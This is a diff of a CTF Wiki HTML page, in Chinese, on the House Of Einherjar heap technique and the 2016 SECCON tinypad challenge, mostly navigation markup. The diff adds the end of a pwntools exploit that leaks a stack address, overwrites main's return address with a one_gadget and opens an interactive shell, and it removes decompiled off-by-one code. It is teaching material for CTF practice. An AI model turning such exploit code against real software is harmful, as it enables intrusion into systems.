+    <span class="n">environ_addr</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">environ_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">environ_addr</span><span class="p">)</span>
+    <span class="n">main_ret_addr</span> <span class="o">=</span> <span class="n">environ_addr</span> <span class="o">-</span> <span class="mi">30</span> <span class="o">*</span> <span class="mi">8</span>
+
+    <span class="c1"># set memo[0].content point to main_ret_addr</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">main_ret_addr</span><span class="p">))</span>
+    <span class="c1"># overwrite main_ret_addr with one_gadget addr</span>
+    <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget_addr</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">run</span><span class="p">()</span>
 </pre></div>
 </div>
-<p><strong>off-by-one</strong></p>
-<p>在程序添加tinypad时，我们可以发现如下代码存在off-by-one漏洞，因为 <code class="docutils literal"><span class="pre">readuntil</span></code> 会在自动填充 :raw-latex:<a href="#id12"><span class="problematic" id="id13">`</span></a>x`00。</p>
-<div class="code c highlight-default"><div class="highlight"><pre><span></span>*(_QWORD *)&amp;tinypad[16 * (idx + 16LL)] = v5;
-*(_QWORD *)&amp;tinypad[16 * (idx + 16LL) + 8] = malloc(v13);
-if ( !*(_QWORD *)&amp;tinypad[16 * (idx + 16LL) + 8] )
-{
-  writerrln(&quot;[!] No memory is available.&quot;, 27LL);
-  exit(-1);
-}
-write_n(&quot;(CONTENT)&gt;&gt;&gt; &quot;, 13LL);
-read_until(*(char **)&amp;tinypad[16 * (idx + 16LL) + 8], v13, 0xAu);
-writeln(&quot;\nAdded.&quot;, 7LL);
-</pre></div>
-</div>
-<p>在程序进行edit操作时使用strcpy时均有可能会出现off-by-one漏洞（当原始tinypad大小为256时）</p>
-<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">tinypad</span><span class="p">[</span><span class="mi">16</span> <span class="o">*</span> <span class="p">(</span><span class="n">idx</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">16</span><span class="n">LL</span><span class="p">)]</span> <span class="p">)</span>
-<span class="p">{</span>
-  <span class="n">c</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>
-  <span class="n">strcpy</span><span class="p">(</span><span class="n">tinypad</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">const</span> <span class="n">char</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">tinypad</span><span class="p">[</span><span class="mi">16</span> <span class="o">*</span> <span class="p">(</span><span class="n">idx</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">16</span><span class="n">LL</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8</span><span class="p">]);</span>
-  <span class="k">while</span> <span class="p">(</span> <span class="n">toupper</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">!=</span> <span class="s1">&#39;Y&#39;</span> <span class="p">)</span>
-  <span class="p">{</span>
-    <span class="n">write_n</span><span class="p">(</span><span class="s2">&quot;CONTENT: &quot;</span><span class="p">,</span> <span class="mi">9</span><span class="n">LL</span><span class="p">);</span>
-    <span class="n">v6</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">tinypad</span><span class="p">);</span>
-    <span class="n">writeln</span><span class="p">(</span><span class="n">tinypad</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>
-    <span class="n">write_n</span><span class="p">(</span><span class="s2">&quot;(CONTENT)&gt;&gt;&gt; &quot;</span><span class="p">,</span> <span class="mi">13</span><span class="n">LL</span><span class="p">);</span>
-    <span class="n">v7</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">const</span> <span class="n">char</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">tinypad</span><span class="p">[</span><span class="mi">16</span> <span class="o">*</span> <span class="p">(</span><span class="n">idx</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">16</span><span class="n">LL</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8</span><span class="p">]);</span>
-    <span class="n">read_until</span><span class="p">(</span><span class="n">tinypad</span><span class="p">,</span> <span class="n">v7</span><span class="p">,</span> <span class="mh">0xA</span><span class="n">u</span><span class="p">);</span>
-    <span class="n">writeln</span><span class="p">(</span><span class="s2">&quot;Is it OK?&quot;</span><span class="p">,</span> <span class="mi">9</span><span class="n">LL</span><span class="p">);</span>
-    <span class="n">write_n</span><span class="p">(</span><span class="s2">&quot;(Y/n)&gt;&gt;&gt; &quot;</span><span class="p">,</span> <span class="mi">9</span><span class="n">LL</span><span class="p">);</span>
-    <span class="n">read_until</span><span class="p">((</span><span class="n">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">c</span><span class="p">,</span> <span class="mi">1</span><span class="n">uLL</span><span class="p">,</span> <span class="mh">0xA</span><span class="n">u</span><span class="p">);</span>
-  <span class="p">}</span>
-  <span class="n">strcpy</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">char</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">tinypad</span><span class="p">[</span><span class="mi">16</span> <span class="o">*</span> <span class="p">(</span><span class="n">idx</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">16</span><span class="n">LL</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8</span><span class="p">],</span> <span class="n">tinypad</span><span class="p">);</span>
-  <span class="n">writeln</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Edited.&quot;</span><span class="p">,</span> <span class="mi">8</span><span class="n">LL</span><span class="p">);</span>
-<span class="p">}</span>
-</pre></div>
 </div>
 </div>
-</div>
-<div class="section" id="id14">
-<h2>参考文献<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h2>
+<div class="section" id="id12">
+<h2>参考文献<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h2>
 <ul class="simple">
 <li><a class="reference external" href="https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606">https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606</a></li>
+<li><a class="reference external" href="https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf">https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf</a></li>
 </ul>
 </div>
 </div>
@@ -311,10 +384,46 @@ writeln(&quot;\nAdded.&quot;, 7LL);
 <li class="toctree-l1"><a class="reference internal" href="../../reverse/linux/index.html">Linux RE</a></li>
 </ul>
 <p class="caption"><span class="caption-text">Pwn</span></p>
-<ul>
+<ul class="current">
 <li class="toctree-l1"><a class="reference internal" href="../stackoverflow/index.html">栈溢出</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../fmtstr/index.html">格式化字符串漏洞</a></li>
-<li class="toctree-l1"><a class="reference internal" href="index.html">堆利用</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="index.html">堆利用</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="heap_overview.html">堆概述</a></li>
+<li class="toctree-l2"><a class="reference internal" href="heap_structure.html">堆相关数据结构</a></li>
+<li class="toctree-l2"><a class="reference internal" href="heap_implementation_details.html">深入理解堆的实现</a></li>
+<li class="toctree-l2"><a class="reference internal" href="heapoverflow_basic.html">堆溢出</a></li>
+<li class="toctree-l2"><a class="reference internal" href="off_by_one.html">堆中的 Off-By-One</a></li>
+<li class="toctree-l2"><a class="reference internal" href="unlink.html">Unlink</a></li>
+<li class="toctree-l2"><a class="reference internal" href="use_after_free.html">Use After Free</a></li>
+<li class="toctree-l2"><a class="reference internal" href="fastbin_attack.html">Fastbin Attack</a></li>
+<li class="toctree-l2"><a class="reference internal" href="chunk_extend_shrink.html">Chunk Extend/Shrink</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">House Of Einherjar</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#id1">介绍</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#id2">原理</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#id3">后向合并操作</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id4">利用原理</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id5">利用过程</a><ul>
+<li class="toctree-l5"><a class="reference internal" href="#id6">溢出前</a></li>
+<li class="toctree-l5"><a class="reference internal" href="#id7">溢出</a></li>
+<li class="toctree-l5"><a class="reference internal" href="#id8">溢出后</a></li>
+</ul>
+</li>
+<li class="toctree-l4"><a class="reference internal" href="#id9">总结</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#seccon-tinypad">2016 Seccon tinypad</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#id10">基本功能分析</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id11">利用</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#id12">参考文献</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="house_of_lore.html">House of Lore</a></li>
+<li class="toctree-l2"><a class="reference internal" href="house_of_force.html">House Of Force</a></li>
+<li class="toctree-l2"><a class="reference internal" href="unsorted_bin_attack.html">Unsorted Bin Attack</a></li>
+</ul>
+</li>
 </ul>
 <p class="caption"><span class="caption-text">Executable</span></p>
 <ul>
@@ -350,8 +459,15 @@ writeln(&quot;\nAdded.&quot;, 7LL);
         <li class="right" style="margin-right: 10px">
           <a href="../../index.html" title="內容目录"
              >toc</a></li>
+        <li class="right" >
+          <a href="house_of_lore.html" title="House of Lore"
+             >下一页</a> &nbsp; &nbsp;</li>
+        <li class="right" >
+          <a href="chunk_extend_shrink.html" title="Chunk Extend/Shrink"
+             >上一页</a> &nbsp; &nbsp;</li>
     <li><a href="../../index.html">CTF Wiki </a> &#187;</li>
- 
+
+          <li class="nav-item nav-item-1"><a href="index.html" >堆利用</a> &#187;</li> 
       </ul>
     </div>
     </div>
